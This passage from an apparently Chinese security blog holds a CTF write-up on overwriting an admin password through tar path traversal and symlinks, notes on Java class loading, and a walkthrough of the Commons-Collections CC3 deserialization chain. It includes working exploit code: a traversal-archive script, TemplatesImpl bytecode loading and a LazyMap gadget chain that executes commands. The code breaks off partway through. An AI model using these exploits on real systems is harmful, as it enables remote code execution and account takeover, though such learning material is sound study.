id="NSSRound-7-Team-新的博客"><a href="#NSSRound-7-Team-新的博客" class="headerlink" title="[NSSRound#7 Team]新的博客"></a>[NSSRound#7 Team]新的博客</h2><p>考点</p><p><img src="../images/image-20230329213834003.png" alt="image-20230329213834003"></p><p>题目</p><p><img src="../images/image-20230330192411011.png" alt="image-20230330192411011"></p><p><img src="../images/image-20230330193239428.png" alt="image-20230330193239428"></p><p>经过两次base和hex解密就得到<code>/static/www.tar.gz</code></p><p>然后访问就会下载下来</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">app/                                                                                                0000777 0000000 0000000 00000000000 14332615660 010036  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/conf/                                                                                           0000777 0000000 0000000 00000000000 14332615660 010763  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/conf/userinfo.json                                                                              0000777 0000000 0000000 00000000222 14332613615 013505  0                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        &#123;</span><br><span class="line">&quot;admin&quot;: &quot;c7ad44cbad762a5da0a452f9e854fdc1e0e7a52a38015f23f3eab1d80b931dd472634dfac71cd34ebc35d16ab7fb8a90c81f975113d6c7538dc69dd8de9077ec&quot;</span><br><span class="line">&#125;                                                                                                                                                                                                                                                                                                                                                                              app/userData/                                                                                       0000777 0000000 0000000 00000000000 14332615671 011610  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/userData/admin/                                                                                 0000777 0000000 0000000 00000000000 14332615671 012700  5                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        app/userData/admin/flag                                                                             0000777 0000000 0000000 00000000070 14332613676 013537  0                                                                                                    ustar 00                                                                0000000 0000000                                                                                                                                                                        想多了这里没有flag</span><br><span class="line"></span><br><span class="line">只有admin才能获得flag   </span><br></pre></td></tr></table></figure><p>通过这个下载的内容我们知道它的目录文件结构</p><p><img src="../images/image-20230330193459337.png" alt="image-20230330193459337"></p><p><img src="../images/image-20230330193539095.png" alt="image-20230330193539095"></p><p>点击博客备份的话会下载用户名.tar.gz文件，所以知道一个结构</p><p><img src="../images/image-20230330193641866.png" alt="image-20230330193641866"></p><p>我们和上一个目录结构对比一下，也有一个flag，然后上面一个用户名，我们根据文件明猜测所有的用户都放在userData之下，包括admin用户。</p><p>所以非预期解就是利用博客恢复功能，上传tar.gz文件，利用这个flag软连接指向/app/conf/userinfo.json，然后再上传一个我们修改后的admin的sha1的json文件，就可以修改admin的密码</p><p>这里因为与软链接连接过后，修改目标文件的话，源文件也会跟着修改，所以我们就直接去修改这个用户名.tar.gz，然后app/conf/userinfo.json也会被修改，所以就是可以自定义admin的密码了(因为还是那个漏洞，就是解压时会覆盖掉目录中的文件)</p><p><strong>预期解</strong></p><p>预期解是利用目录穿越直接覆盖掉userinfo.json文件吧，在搞预期解的时候真的非常头疼，一直手撸不出来那个目录结构，同时利用官方WP的脚本一直报错，就很难受，无奈只能改一下脚本：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os, hashlib, json</span><br><span class="line"> </span><br><span class="line">username = <span class="string">&#x27;qingfeng&#x27;</span> <span class="comment"># 你注册时用的用户名，尽量别有奇怪的符号</span></span><br><span class="line">admin_passwd = <span class="string">&#x27;admin&#x27;</span> <span class="comment"># 之后要使用admin账户登陆时的密码</span></span><br><span class="line"> </span><br><span class="line">os.makedirs(<span class="string">&#x27;conf&#x27;</span>)</span><br><span class="line">os.makedirs(os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>, username]))</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(os.sep.join([os.getcwd(), <span class="string">&#x27;conf&#x27;</span>, <span class="string">&#x27;userinfo.json&#x27;</span>]), <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> tFile:</span><br><span class="line">    tFile.write(json.dumps(&#123;<span class="string">&#x27;admin&#x27;</span>: hashlib.sha512(admin_passwd.encode(<span class="string">&#x27;utf-8&#x27;</span>)).hexdigest()&#125;).encode(<span class="string">&#x27;utf-8&#x27;</span>))</span><br><span class="line">userDataDir = os.sep.join([os.getcwd(), <span class="string">&#x27;userData&#x27;</span>])</span><br><span class="line">os.system(<span class="string">f&#x27;cd &quot;<span class="subst">&#123;userDataDir&#125;</span>&quot; &amp;&amp; tar cPzvf upload.tar.gz <span class="subst">&#123;username&#125;</span>/../../conf/userinfo.json&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="NSSRound-3-Team-This1sMysql"><a href="#NSSRound-3-Team-This1sMysql" class="headerlink" title="[NSSRound#3 Team]This1sMysql"></a>[NSSRound#3 Team]This1sMysql</h2><p>考点</p><p><img src="../images/image-20230330202900747.png" alt="image-20230330202900747"></p><p>题目</p>]]></content>
      
      
      
        <tags>
            
            <tag> nssctf web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动态类加载</title>
      <link href="/posts/fcb7f5f0.html"/>
      <url>/posts/fcb7f5f0.html</url>
      
        <content type="html"><![CDATA[<p>视频地址 <a href="https://www.bilibili.com/video/BV16h411z7o9?p=4&amp;vd_source=bacfffe46b930fda5761b63367eb298c">动态类加载</a></p><p><img src="../images/image-20230320171305517.png" alt="image-20230320171305517"></p><p>学习这个东西得需要两个代码</p><p><strong>Person.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//构造函数</span></span><br><span class="line">        System.out.println(<span class="string">&quot;无参person&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">int</span> id;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">staticAction</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;静态方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;构造代码块&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">(String name,<span class="type">int</span> age)</span></span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;有参person&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.name=name;</span><br><span class="line">        <span class="built_in">this</span>.age=age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">//对Serializable这个接口里的toString函数进行重写</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Person&#123;&quot;</span> +</span><br><span class="line">                <span class="string">&quot;name=&#x27;&quot;</span> + name + <span class="string">&#x27;\&#x27;&#x27;</span> +</span><br><span class="line">                <span class="string">&quot;,age=&quot;</span> + age +</span><br><span class="line">                <span class="string">&#x27;&#125;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">action</span><span class="params">(String act)</span> <span class="keyword">throws</span> IOException</span><br><span class="line">    &#123;</span><br><span class="line">        System.out.println(act);</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream ois)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">//重新对readObject函数进行重写，然后在里面加一条命令执行的语句，这样的话就会在反序列化的时候就会执行，这样的话就会造成安全问题</span></span><br><span class="line">        ois.defaultReadObject();;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;calc&quot;</span>); <span class="comment">//Runtime.getRuntime().exec 用于调用外部可执行程序或系统命令</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>就是相较于以前多了(下面的三个东西)</p><p><img src="../images/image-20230320165602512.png" alt="image-20230320165602512"></p><p>在new一个无参对象的时候</p><p><img src="../images/image-20230320165706358.png" alt="image-20230320165706358"></p><p>在new一个有参对象的时候</p><p><img src="../images/image-20230320165748935.png" alt="image-20230320165748935"></p><p>是一样的</p><p>都是先静态代码块——-&gt;   构造代码块    ——-&gt;  有(无)参方法</p><p><img src="../images/image-20230320170134879.png" alt="image-20230320170134879"></p><p>当调用类的方法的时候，就不会调用其他关于对象的方法</p><p><img src="../images/image-20230320170226755.png" alt="image-20230320170226755"></p><p>这三个就是和对象相关的，所以不会调用</p><p><img src="../images/image-20230320170355436.png" alt="image-20230320170355436"></p><p>在调用这个静态变量的时候也调用了这个静态代码块</p><p>在类加载的时候是不会进行任何方法或者变量的调用的</p><p><img src="../images/image-20230320171803411.png" alt="image-20230320171803411"></p><p>上面的方法都是写死的，不能进行动态加载，所以这里我们就用到了之前在反射里面用到的方法      <strong>forName</strong></p><p><img src="../images/image-20230320172620889.png" alt="image-20230320172620889"></p><p>就是这个方法进行了<strong>初始化</strong>的操作   (已知初始化操作会执行静态代码块)</p><p><img src="../images/image-20230320172703713.png" alt="image-20230320172703713"></p><p>然后跟进这个forName0的方法，这个方法是native写的，是c来写的</p><p><img src="../images/image-20230320175604207.png" alt="image-20230320175604207"></p><p>他里面有几个参数</p><p>第一个是传类名，第二个是判断是否初始化，第三个是类加载器，第四个不重要</p><p>因为forName里面默认的是否初始化是true，所以如果想让他不进行初始化的话，就传值，因为Class这个类里边还有另一个forName</p><p><img src="../images/image-20230320180218646.png" alt="image-20230320180218646"></p><p>因为ClassLoader是一个抽象类，不能实例化，但是他有个静态方法是可以实例化的</p><p><img src="../images/image-20230320180742675.png" alt="image-20230320180742675"></p><p>这里只传三个参数是因为forName只有三个参数，forName0才是有四个参数的</p><p>这样写就不能进行实例化和初始化了</p><p>我们可以利用反射里面学的newIntance()方法来进行实例化和初始化了</p><p><img src="../images/image-20230320183317612.png" alt="image-20230320183317612"></p><p><strong>上面大概介绍完就开始讲这个类加载器的东西了</strong></p><p><img src="../images/image-20230320184323015.png" alt="image-20230320184323015"></p><p>就是利用这个动态类加载来进行实例化对象(<strong>这里说明一下这个loadClass是不进行初始化的</strong>)</p><p><img src="../images/image-20230320184435751.png" alt="image-20230320184435751"></p><p>上面是简单的介绍，详细的看这篇文章      <a href="https://zhuanlan.zhihu.com/p/567962697">动态类加载</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> java 动态类加载 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>java反序列化-cc3</title>
      <link href="/posts/a68e45f7.html"/>
      <url>/posts/a68e45f7.html</url>
      
        <content type="html"><![CDATA[<p>cc3这条链和前面的cc1和cc6是不同的，这个执行命令用的是<strong>动态类加载</strong></p><p>不是Runtime.getRuntime.exec()</p><h3 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a><strong>InvokerTransformer</strong></h3><p>所以说学这条链子之前得去学下啥是动态类加载</p><p> 因为动态类加载的时候会调用loadclass，然后loadclass最后就会调用到defineclass,然后因为最后调用的defineclass不是public的，所以我们得去找哪个类里边重写了这个函数，并且是public的</p><p><img src="../images/image-20230321221053484.png" alt="image-20230321221053484"></p><p>这个函数参数的找不到有重写然后是public的调用他</p><p>然后发现了这种类型的defineclass有函数调用</p><p><img src="../images/image-20230321221604507.png" alt="image-20230321221604507"></p><p>然后还是default类型的(这个类型说明了这个包里可以调用他)</p><p>然后我们跟进去，看谁调用了这个default的defineclass</p><p><img src="../images/image-20230321221849460.png" alt="image-20230321221849460"></p><p>在他自身类里边的这个函数调用了default方法，但是这个是private的，所以我们就继续找哪个public调用了他</p><p><img src="../images/image-20230321222150282.png" alt="image-20230321222150282"></p><p>然后找到了一个private方法里面有个实例化的方法，</p><p>所以我们就接着往下找，找哪个public方法里面调用了他</p><p><img src="../images/image-20230321222331758.png" alt="image-20230321222331758"></p><p>最后找到这个public就找完了</p><p>然后我们就得想想怎么控制这个实例化对象</p><p><img src="../images/image-20230322194209379.png" alt="image-20230322194209379"></p><p>然后看到上图就看到了defineTransletClasses()这个函数方法是可以赋值传参的</p><p><img src="../images/image-20230322194315725.png" alt="image-20230322194315725"></p><p>在满足上面的条件后就可以进行赋值了</p><p>通过上面的寻找，发现找的函数方法全在TemplatesImpI这个类里边，并且这个类还可以进行序列化，那么这个里面里边的参数我们就都可以进行控制了(反射)</p><p><img src="../images/image-20230322194840494.png" alt="image-20230322194840494"></p><p><strong>第一步的出发点</strong>，<strong>得用这个来触发defineClass</strong></p><p><img src="../images/image-20230322195037005.png" alt="image-20230322195037005"></p><p><img src="../images/image-20230322195128556.png" alt="image-20230322195128556"></p><p><img src="../images/image-20230322195140695.png" alt="image-20230322195140695"></p><p>这里话我们是想先去调用第二个if里边的函数方法，来给下面的实例化对象赋值</p><p>跟进这个函数后(就会发现有两个if必须满足，因为第一个如果不满足的话就会抛异常，第二个是因为得给他赋值让他调用函数方法)<strong>这里赋值的原因是因为这个TemplatesImpI类的构造函数没有进行赋值</strong></p><p><img src="../images/image-20230322195459426.png" alt="image-20230322195459426"></p><p>所以接下来我们开始进行赋值，先从getTransletInstance()这个函数开始，就是献给name赋值</p><p>然后再给_bytecodes赋值,因为就是不能让他抛异常(这里给bytecodes赋值是有讲究的)实例化时需要的类是由bytecodes赋值的，而且还由于最后的defineclass()函数，这里的话bytecodes的类型还是得进行限制的</p><p><img src="../images/image-20230322201130287.png" alt="image-20230322201130287"></p><p><img src="../images/image-20230322201336724.png" alt="image-20230322201336724"></p><p><img src="../images/image-20230322201345186.png" alt="image-20230322201345186"></p><p>最后写出来的成果</p><p>因为类里边的bytecodes是个二维数组，所以初始化的时候就先给他变为二维数组，然后因为得需要他的一维数组进行赋值，所以在嵌套一个一维数组</p><p>然后最后还有一个_tfactory没有进行赋值，所以我们就得对他进行赋值，不然会报错</p><p><img src="../images/image-20230322202030498.png" alt="image-20230322202030498"></p><p>这就是他的类型(然后这个参数是transient，就是不可以进行序列化的意思)</p><p>所以我们就猜它是在readObject里面进行赋值的</p><p><img src="../images/image-20230322202306042.png" alt="image-20230322202306042"></p><p>最下面就看到它了</p><p><img src="../images/image-20230322202519552.png" alt="image-20230322202519552"></p><p>赋值成功</p><p>然后运行发现没成功(发现在defineTransletClasses这个函数里边的下面那个参数为空，然后爆了空指针错误)</p><p><img src="../images/image-20230322203013541.png" alt="image-20230322203013541"></p><p>但是单休改这个参数没啥大的意义，因为transletIndex值为-1，到了下面的if判断还是会抛异常出错</p><p><img src="../images/image-20230322203529965.png" alt="image-20230322203529965"></p><p>所以我们就先得满足这个</p><p><img src="../images/image-20230322203759237.png" alt="image-20230322203759237"></p><p>让他的值不为-1，然后跟进去后发现</p><p><img src="../images/image-20230322203953283.png" alt="image-20230322203953283"></p><p>这里要求要和superClass里面的类相等，所以我们就得在弹计算器的类里边更改</p><p><strong>cc3完整代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">           <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">           <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">           field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/test.class&quot;</span>));</span><br><span class="line">           <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">           field1.set(templates,codes);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">           field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field2.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">           templates.newTransformer();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>test.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">test</span> <span class="keyword">extends</span> <span class="title class_">AbstractTranslet</span> &#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">&quot;notepad&quot;</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, SerializationHandler[] handlers)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">transform</span><span class="params">(DOM document, DTMAxisIterator iterator, SerializationHandler handler)</span> <span class="keyword">throws</span> TransletException &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面写的代码是对这条链子的一个基本解释，接下来我们用cc1里的方法来对上面的代码进行反序列化操作</p><p><img src="../images/image-20230322214845664.png" alt="image-20230322214845664"></p><p>然后我们再把cc1后面的代码拿过来  就可以了，cc1的代码只是为了来触发transform.</p><p><strong>完整代码</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Path;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">cc3</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span><br><span class="line">    &#123;</span><br><span class="line">           <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">           <span class="type">Class</span> <span class="variable">tc</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">           field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field1</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">           field1.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D://tmp/test.class&quot;</span>));</span><br><span class="line">           <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">           field1.set(templates,codes);</span><br><span class="line">           <span class="type">Field</span> <span class="variable">field2</span> <span class="operator">=</span> tc.getDeclaredField(<span class="string">&quot;_tfactory&quot;</span>);</span><br><span class="line">           field2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">           field2.set(templates,<span class="keyword">new</span> <span class="title class_">TransformerFactoryImpl</span>());</span><br><span class="line">           <span class="comment">//templates.newTransformer();</span></span><br><span class="line"></span><br><span class="line">           Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]</span><br><span class="line">                   &#123;</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(templates),</span><br><span class="line">                           <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;newTransformer&quot;</span>,<span class="literal">null</span>,<span class="literal">null</span>)</span><br><span class="line"></span><br><span class="line">                   &#125;;</span><br><span class="line">           <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">           <span class="comment">//chainedTransformer.transform(1);</span></span><br><span class="line">           HashMap&lt;Object,Object&gt; hashMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">           Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(hashMap,chainedTransformer);</span><br><span class="line">           <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> Class.forName(<span 